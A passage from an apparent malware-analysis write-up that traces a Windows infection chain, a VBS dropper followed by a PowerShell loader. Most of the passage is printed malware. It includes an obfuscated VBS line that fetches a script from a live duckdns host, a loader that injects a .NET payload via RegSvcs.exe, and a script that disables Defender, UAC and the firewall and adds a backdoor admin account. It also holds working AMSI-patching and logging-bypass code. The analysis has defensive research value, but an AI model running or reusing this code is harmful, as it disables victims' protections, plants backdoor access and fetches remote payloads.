<span class="n">AGJZU</span><span class="w"> </span><span class="n">STARTUP</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\WindowsServices-MMCVF.lnk"</span><span class="p">,</span><span class="n">STARTUP</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\FPMNG.vbs"</span><span class="w"> </span>

<span class="n">HIZHA</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://tiny23.duckdns.org/paste.txt"</span><span class="w"></span>
<span class="n">SCLBY</span><span class="p">(</span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\BJUEL.ps1"</span><span class="p">)</span><span class="w"></span>
<span class="n">YEKOQ</span><span class="w"> </span><span class="n">HIZHA</span><span class="p">,</span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\BJUEL.ps1"</span><span class="w"></span>
<span class="n">TAWBD</span><span class="p">(</span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\BJUEL.ps1"</span><span class="p">)</span><span class="w"></span>

<span class="n">WScript</span><span class="p">.</span><span class="n">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span><span class="w"></span>

<span class="n">YRVPO</span><span class="w"> </span><span class="n">APPDATA</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\DOJVJ.cmd"</span><span class="p">,</span><span class="n">APPDATA</span><span class="w"></span>
</pre></div>
<h3 id="Stage-2---PS-Script">
<a class="anchor" href="#Stage-2---PS-Script" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 2 - PS Script<a class="anchor-link" href="#Stage-2---PS-Script"> </a>
</h3>
<p>The script is downloaded from http[:]//tiny23.duckdns[.]org/paste.txt and contains three encoded data strings.</p>
<p><a href="https://malshare.com/sample.php?action=detail&amp;hash=12599f668d7d7bfa6882e4f78f3523c14c7e5d02ee1f7d0379d17878caf91e07">12599f668d7d7bfa6882e4f78f3523c14c7e5d02ee1f7d0379d17878caf91e07</a></p>
<ul>
<li>PS Script to kill Defender and setup env</li>
<li>PS Script to bypass AMSI</li>
<li>Binary .NET injector</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">try</span> 
<span class="p">{</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="p">}</span>
<span class="nb">start-sleep</span> <span class="n">3</span>
<span class="k">Function</span> <span class="n">asjdiwWWWW</span><span class="p">(</span><span class="nv">$Yatak</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$byteList</span> <span class="p">=</span> <span class="no">[System.Collections.Generic.List[Byte]]</span><span class="p">::</span><span class="n">new</span><span class="p">()</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$Yatak</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$i</span> <span class="p">+=</span><span class="n">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$byteList</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToByte</span><span class="p">(</span><span class="no">[String]</span> <span class="nv">$Yatak</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="n">8</span><span class="p">),</span> <span class="n">2</span><span class="p">))</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$byteList</span><span class="p">.</span><span class="n">ToArray</span><span class="p">())</span>
<span class="p">}</span>
<span class="k">Function</span> <span class="n">holakabutr</span><span class="p">(</span><span class="no">[String]</span> <span class="nv">$IN</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$RNBX1</span> <span class="p">=</span> <span class="nv">$IN</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'~'</span><span class="p">,</span><span class="s1">'000'</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span><span class="s1">'4'</span><span class="p">)</span>
    <span class="nv">$bytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">-ArgumentList</span> <span class="p">(</span><span class="nv">$RNBX1</span><span class="p">.</span><span class="n">Length</span> <span class="p">/</span> <span class="n">1</span><span class="p">+</span><span class="n">1</span><span class="p">+</span><span class="n">0</span><span class="p">)</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$RNBX1</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$i</span> <span class="p">+=</span> <span class="n">1</span><span class="p">+</span><span class="n">1</span><span class="p">+</span><span class="n">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$bytes</span><span class="p">[</span><span class="nv">$i</span> <span class="p">/</span> <span class="n">2</span><span class="p">]</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToByte</span><span class="p">(</span><span class="nv">$RNBX1</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="n">1</span><span class="p">+</span><span class="n">1</span><span class="p">+</span><span class="n">0</span><span class="p">),</span> <span class="n">6</span><span class="p">+</span><span class="n">10</span><span class="p">+</span><span class="n">0</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="no">[byte[]]</span><span class="nv">$bytes</span>
<span class="p">}</span>


<span class="nb">start-sleep</span> <span class="n">3</span>

<span class="nv">$CLE11</span> <span class="p">=</span> <span class="s1">''</span>

<span class="nv">$CLE11</span> <span class="p">=</span> <span class="s1">'BinaryChange'</span>


<span class="nv">$RNBX1</span> <span class="p">=</span> <span class="s1">'pe_file_removed'</span>


<span class="nv">$tempfolder</span> <span class="p">=</span> <span class="nv">$env:temp</span>
<span class="nv">$destinazione</span> <span class="p">=</span> <span class="nv">$tempfolder</span> <span class="p">+</span> <span class="s2">"\RegSvcs.exe"</span> 
<span class="nv">$Path</span>  <span class="p">=</span> <span class="s1">'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe'</span>
<span class="nb">Copy-Item</span> <span class="nv">$Path</span> <span class="n">-Destination</span> <span class="nv">$destinazione</span>

 <span class="k">Function</span> <span class="n">MyFunciton</span><span class="p">(</span><span class="nv">$Var</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">return</span> <span class="nv">$Var</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">'CALC.PAYSIAS'</span><span class="p">)</span>
  <span class="p">}</span>
 <span class="k">try</span> 
<span class="p">{</span>
    <span class="no">[byte[]]</span><span class="nv">$WULC4</span> <span class="p">=</span> <span class="n">holakabutr</span><span class="p">(</span><span class="nv">$CLE11</span><span class="p">)</span>
    <span class="no">[byte[]]</span><span class="nv">$YIV4Z</span> <span class="p">=</span> <span class="n">holakabutr</span><span class="p">(</span><span class="nv">$RNBX1</span><span class="p">)</span>
    <span class="nv">$execute</span> <span class="p">=</span> <span class="p">(</span><span class="n">asjdiwWWWW</span><span class="p">(</span><span class="s2">"%1%%%1%1%1111%%%%11%%1%1%11%%%11%111%1%1%111%1%%%11%%1%1"</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">)))</span>
    <span class="nv">$invoke</span> <span class="p">=</span> <span class="p">(</span><span class="n">asjdiwWWWW</span><span class="p">(</span><span class="s2">"0%00%00%0%%0%%%00%%%0%%00%%0%%%%0%%0%0%%0%%00%0%"</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)))</span>
    <span class="nv">$Path</span>  <span class="p">=</span> <span class="nv">$destinazione</span>
    <span class="nv">$Path2</span>  <span class="p">=</span> <span class="s1">''</span>
    <span class="nv">$Path3</span>  <span class="p">=</span> <span class="s1">''</span>


 <span class="k">try</span> 
<span class="p">{</span>
<span class="nv">$ncr3</span> <span class="p">=</span> <span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span>
    <span class="nv">$ncrx3</span> <span class="p">=</span> <span class="nv">$ncr3</span><span class="p">::</span><span class="n">Load</span><span class="p">((</span><span class="nv">$YIV4Z</span><span class="p">))</span>
    <span class="nv">$TXN4Z</span> <span class="p">=</span> <span class="n">MyFunciton</span><span class="p">(</span><span class="nv">$ncrx3</span><span class="p">);</span>
    <span class="nv">$MG5X</span> <span class="p">=</span> <span class="nv">$TXN4Z</span><span class="p">.</span><span class="s1">'GetMethod'</span><span class="p">(</span><span class="nv">$execute</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="p">}</span>

   <span class="k">try</span> 
<span class="p">{</span>

  <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="p">}</span>


   <span class="k">try</span> 
<span class="p">{</span>
<span class="nv">$MG5X</span><span class="p">.</span><span class="nv">$invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="no">[object[]]</span> <span class="p">(</span><span class="nv">$Path</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">"%%"</span><span class="p">,</span><span class="s2">""</span><span class="p">),</span><span class="nv">$WULC4</span><span class="p">));</span>
<span class="nv">$MG5X</span><span class="p">.</span><span class="nv">$invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="no">[object[]]</span> <span class="p">(</span><span class="nv">$Path2</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">"%%"</span><span class="p">,</span><span class="s2">""</span><span class="p">),</span><span class="nv">$WULC4</span><span class="p">));</span>
<span class="nv">$MG5X</span><span class="p">.</span><span class="nv">$invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="no">[object[]]</span> <span class="p">(</span><span class="nv">$Path3</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s2">"%%"</span><span class="p">,</span><span class="s2">""</span><span class="p">),</span><span class="nv">$WULC4</span><span class="p">));</span>

   <span class="nv">$OASI4</span> <span class="p">=</span> <span class="p">(</span><span class="n">asjdiwWWWW</span><span class="p">(</span><span class="s2">"ps_script_1"</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'~'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)))</span>
<span class="nv">$OASI4</span> <span class="p">|</span> <span class="p">.(</span><span class="s1">'{x}{9}'</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'9'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s1">'x'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span><span class="o">-f</span><span class="s1">'lun'</span><span class="p">,</span><span class="s1">'%%'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s1">'%%'</span><span class="p">,</span><span class="s1">'I'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s1">'lun'</span><span class="p">,</span><span class="s1">'EX'</span><span class="p">)</span>
<span class="nv">$DEF</span> <span class="p">=</span> <span class="p">(</span><span class="n">asjdiwWWWW</span><span class="p">(</span><span class="s2">"ps_script_2"</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'~'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)))</span>
<span class="nv">$DEF</span> <span class="p">|</span> <span class="p">.(</span><span class="s1">'{x}{9}'</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'9'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s1">'x'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">)</span><span class="o">-f</span><span class="s1">'lun'</span><span class="p">,</span><span class="s1">'%%'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s1">'%%'</span><span class="p">,</span><span class="s1">'I'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s1">'lun'</span><span class="p">,</span><span class="s1">'EX'</span><span class="p">)</span>

  <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="p">}</span>

   <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="p">}</span>
</pre></div>
<h3 id="Stage-3">
<a class="anchor" href="#Stage-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Stage 3<a class="anchor-link" href="#Stage-3"> </a>
</h3>
<h4 id="PS-Script-1---Kill-Windows-Defender">
<a class="anchor" href="#PS-Script-1---Kill-Windows-Defender" aria-hidden="true"><span class="octicon octicon-link"></span></a>PS Script 1 - Kill Windows Defender<a class="anchor-link" href="#PS-Script-1---Kill-Windows-Defender"> </a>
</h4>
<div class="highlight"><pre><span></span><span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".bat"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".ppam"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".xls"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".bat"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".exe"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".vbs"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span> <span class="s2">".js"</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span>  <span class="n">C</span><span class="err">:</span><span class="p">\</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span>  <span class="n">D</span><span class="err">:</span><span class="p">\</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span>  <span class="n">E</span><span class="err">:</span><span class="p">\</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span>  <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">MEMEMAN</span><span class="p">\</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">explorer</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">dll</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">aspnet_compiler</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">cvtres</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">CasPol</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">csc</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">Msbuild</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">ilasm</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">InstallUtil</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">jsc</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">Calc</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">rundll32</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">mshta</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">DefenderisasuckingAntivirus</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="n">wscript</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionIpAddress</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>
<span class="nb">Add-MpPreference</span> <span class="n">-ThreatIDDefaultAction_Actions</span> <span class="n">6</span>
<span class="nb">Add-MpPreference</span> <span class="n">-AttackSurfaceReductionRules_Ids</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableIntrusionPreventionSystem</span> <span class="nv">$true</span> <span class="n">-DisableIOAVProtection</span> <span class="nv">$true</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span> <span class="n">-DisableScriptScanning</span> <span class="nv">$true</span> <span class="n">-EnableControlledFolderAccess</span> <span class="n">Disabled</span> <span class="n">-EnableNetworkProtection</span> <span class="n">AuditMode</span> <span class="n">-Force</span> <span class="n">-MAPSReporting</span> <span class="n">Disabled</span> <span class="n">-SubmitSamplesConsent</span> <span class="n">NeverSend</span>
<span class="nb">Set-MpPreference</span> <span class="n">-EnableControlledFolderAccess</span> <span class="n">Disabled</span>
<span class="nb">Set-MpPreference</span> <span class="n">-PUAProtection</span> <span class="n">disable</span>
<span class="nb">Set-MpPreference</span> <span class="n">-HighThreatDefaultAction</span> <span class="n">6</span> <span class="n">-Force</span>
<span class="nb">Set-MpPreference</span> <span class="n">-ModerateThreatDefaultAction</span> <span class="n">6</span>
<span class="nb">Set-MpPreference</span> <span class="n">-LowThreatDefaultAction</span> <span class="n">6</span>
<span class="nb">Set-MpPreference</span> <span class="n">-SevereThreatDefaultAction</span> <span class="n">6</span>
<span class="nb">Set-MpPreference</span> <span class="n">-ScanScheduleDay</span> <span class="n">8</span>
<span class="nb">New-Ipublicroperty</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="err">:</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">policies</span><span class="p">\</span><span class="n">system</span> <span class="n">-Name</span> <span class="n">EnableLUA</span> <span class="n">-PropertyType</span> <span class="n">DWord</span> <span class="n">-Value</span> <span class="n">0</span> <span class="n">-Force</span>
<span class="nb">Stop-Service</span> <span class="n">-Name</span> <span class="n">WinDefend</span> <span class="n">-Confirm</span><span class="err">:</span><span class="nv">$false</span> <span class="n">-Force</span>
<span class="nb">Set-Service</span> <span class="n">-Name</span> <span class="n">WinDefend</span> <span class="n">-StartupType</span> <span class="n">Disabled</span>
<span class="n">net</span> <span class="n">user</span> <span class="n">System32</span> <span class="p">/</span><span class="n">add</span>
<span class="n">net</span> <span class="n">user</span> <span class="n">System32</span> <span class="n">123</span>
<span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="n">System32</span> <span class="p">/</span><span class="n">add</span>
<span class="n">net</span> <span class="n">localgroup</span> <span class="s2">"Remote Desktop Users"</span> <span class="n">System32</span> <span class="p">/</span><span class="n">add</span>
<span class="n">net</span> <span class="n">stop</span> <span class="n">WinDefend</span>
<span class="n">net</span> <span class="n">stop</span> <span class="n">WdNisSvc</span>
<span class="nb">sc </span><span class="n">delete</span> <span class="n">windefend</span>
<span class="n">netsh</span> <span class="n">advfirewall</span> <span class="nb">set </span><span class="n">allprofiles</span> <span class="n">state</span> <span class="n">off</span>
</pre></div>
<ul>
<li>Using the string <code>DefenderisasuckingAntivirus</code> we can pivot and identify previous uses of the script<ul>
<li><a href="https://www.fortinet.com/blog/threat-research/tax-scammers-at-large">Deja Vu All Over Again: Tax Scammers at Large</a></li>
</ul>
</li>
</ul>
<h4 id="PS-Script-2---Bypass-AMSI">
<a class="anchor" href="#PS-Script-2---Bypass-AMSI" aria-hidden="true"><span class="octicon octicon-link"></span></a>PS Script 2 - Bypass AMSI<a class="anchor-link" href="#PS-Script-2---Bypass-AMSI"> </a>
</h4>
<div class="highlight"><pre><span></span><span class="nb">start-sleep</span> <span class="n">23</span>
<span class="c"># Disable Script Logging:</span>
<span class="nv">$settings</span> <span class="p">=</span> <span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.Utils"</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s2">"cachedGroupPolicySettings"</span><span class="p">,</span><span class="s2">"NonPublic,Static"</span><span class="p">).</span><span class="n">GetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">);</span>
<span class="nv">$settings</span><span class="p">[</span><span class="s2">"HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"</span><span class="p">]</span> <span class="p">=</span> <span class="p">@{}</span>
<span class="nv">$settings</span><span class="p">[</span><span class="s2">"HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"</span><span class="p">].</span><span class="n">Add</span><span class="p">(</span><span class="s2">"EnableScriptBlockLogging"</span><span class="p">,</span> <span class="s2">"0"</span><span class="p">)</span>

<span class="c"># Matt Graebers Reflection method:</span>
<span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.AmsiUtils'</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">'amsiInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>

<span class="c"># Forcing an error:</span>
<span class="nv">$mem</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="n">9076</span><span class="p">)</span>
<span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s2">"amsiSession"</span><span class="p">,</span><span class="s2">"NonPublic,Static"</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span> <span class="nv">$null</span><span class="p">);</span><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s2">"amsiContext"</span><span class="p">,</span><span class="s2">"NonPublic,Static"</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span> <span class="no">[IntPtr]</span><span class="nv">$mem</span><span class="p">)</span>


<span class="nb">start-sleep</span> <span class="n">12</span>
<span class="nv">$Win32</span> <span class="p">=</span> <span class="sh">@"</span>
<span class="sh">using System;</span>
<span class="sh">using System.Runtime.InteropServices;</span>
<span class="sh">public class Win32 {</span>
<span class="sh">    [DllImport("kernel32")]</span>
<span class="sh">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span>
<span class="sh">    [DllImport("kernel32")]</span>
<span class="sh">    public static extern IntPtr LoadLibrary(string name);</span>
<span class="sh">    [DllImport("kernel32")]</span>
<span class="sh">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span>
<span class="sh">}</span>
<span class="sh">"@</span>

<span class="nb">Add-Type</span> <span class="nv">$Win32</span>

<span class="nv">$LoadLibrary</span> <span class="p">=</span> <span class="no">[Win32]</span><span class="p">::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"am"</span> <span class="p">+</span> <span class="s2">"si.dll"</span><span class="p">)</span>
<span class="nv">$Address</span> <span class="p">=</span> <span class="no">[Win32]</span><span class="p">::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$LoadLibrary</span><span class="p">,</span> <span class="s2">"AmsiScanBuffer"</span><span class="p">)</span>
<span class="nv">$p</span> <span class="p">=</span> <span class="n">0</span>
<span class="no">[Win32]</span><span class="p">::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$Address</span><span class="p">,</span> <span class="no">[uint32]5, 0x40, [ref]</span><span class="nv">$p</span><span class="p">)</span>
<span class="nv">$Patch</span> <span class="p">=</span> <span class="no">[Byte[]]</span> <span class="p">(</span><span class="n">0xB8</span><span class="p">,</span> <span class="n">0x57</span><span class="p">,</span> <span class="n">0x00</span><span class="p">,</span> <span class="n">0x07</span><span class="p">,</span> <span class="n">0x80</span><span class="p">,</span> <span class="n">0xC3</span><span class="p">)</span>
<span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$Patch</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Address</span><span class="p">,</span> <span class="n">6</span><span class="p">)</span>


<span class="nb">start-sleep</span> <span class="n">7</span>


<span class="nv">$ZQCUW</span> <span class="p">=</span> <span class="sh">@"</span>
<span class="sh">using System;</span>
<span class="sh">using System.Runtime.InteropServices;</span>
<span class="sh">public class ZQCUW {</span>
<span class="sh">    [DllImport("kernel32")]</span>
<span class="sh">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span>
<span class="sh">    [DllImport("kernel32")]</span>
<span class="sh">    public static extern IntPtr LoadLibrary(string name);</span>
<span class="sh">    [DllImport("kernel32")]</span>
<span class="sh">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span>
<span class="sh">}</span>
<span class="sh">"@</span>

<span class="nb">Add-Type</span> <span class="nv">$ZQCUW</span>

<span class="nv">$BBWHVWQ</span> <span class="p">=</span> <span class="no">[ZQCUW]</span><span class="p">::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"amsi.dll"</span><span class="p">)</span>
<span class="nv">$XPYMWR</span> <span class="p">=</span> <span class="no">[ZQCUW]</span><span class="p">::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$BBWHVWQ</span><span class="p">,</span> <span class="s2">"AmsiScanBuffer)"</span><span class="p">)</span>
<span class="nv">$p</span> <span class="p">=</span> <span class="n">0</span>
<span class="no">[ZQCUW]</span><span class="p">::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$XPYMWR</span><span class="p">,</span> <span class="no">[uint32]5, 0x40, [ref]</span><span class="nv">$p</span><span class="p">)</span>
<span class="nv">$TLML</span> <span class="p">=</span> <span class="s2">"0xB8"</span>
<span class="nv">$PURX</span> <span class="p">=</span> <span class="s2">"0x57"</span>
<span class="nv">$YNWL</span> <span class="p">=</span> <span class="s2">"0x00"</span>
<span class="nv">$RTGX</span> <span class="p">=</span> <span class="s2">"0x07"</span>
<span class="nv">$XVON</span> <span class="p">=</span> <span class="s2">"0x80"</span>
<span class="nv">$WRUD</span> <span class="p">=</span> <span class="s2">"0xC3"</span>
<span class="nv">$KTMJX</span> <span class="p">=</span> <span class="no">[Byte[]]</span> <span class="p">(</span><span class="nv">$TLML</span><span class="p">,</span><span class="nv">$PURX</span><span class="p">,</span><span class="nv">$YNWL</span><span class="p">,</span><span class="nv">$RTGX</span><span class="p">,+</span><span class="nv">$XVON</span><span class="p">,+</span><span class="nv">$WRUD</span><span class="p">)</span>
<span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$KTMJX</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$XPYMWR</span><span class="p">,</span> <span class="n">6</span><span class="p">)</span>
</pre></div>
<h5 id="AMSI-Bypass">
<a class="anchor" href="#AMSI-Bypass" aria-hidden="true"><span class="octicon octicon-link"></span></a>AMSI Bypass<a class="anchor-link" href="#AMSI-Bypass"> </a>
</h5>
<p><a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">The difference between Powershell only &amp; process specific AMSI bypasses</a></p>
<p>This patches out <code>AmsiScanBuffer</code> with an error return code <code>0x80070057' 'parameter is incorrect</code>.</p>

<pre><code>B8 57 00 07 80   mov eax, 0x80070057
C3               ret</code></pre>
<h4 id=".NET-Injector">
<a class="anchor" href="#.NET-Injector" aria-hidden="true"><span class="octicon octicon-link"></span></a>.NET Injector<a class="anchor-link" href="#.NET-Injector"> </a>
</h4>
